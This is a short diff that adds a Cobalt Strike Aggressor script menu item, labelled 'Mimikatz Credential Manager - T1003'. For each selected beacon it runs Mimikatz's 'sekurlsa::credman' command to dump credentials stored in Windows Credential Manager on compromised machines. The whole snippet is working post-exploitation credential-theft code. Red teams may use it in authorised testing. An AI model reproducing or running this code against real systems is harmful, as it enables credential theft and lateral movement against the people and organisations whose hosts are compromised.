@@ -1,0 +1,13 @@
+item "Mimikatz Credential Manager  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					credman($bid);
+				}
+			}
+			
+			
+sub credman{
+
+bmimikatz($1, "sekurlsa::credman");
+
+}			
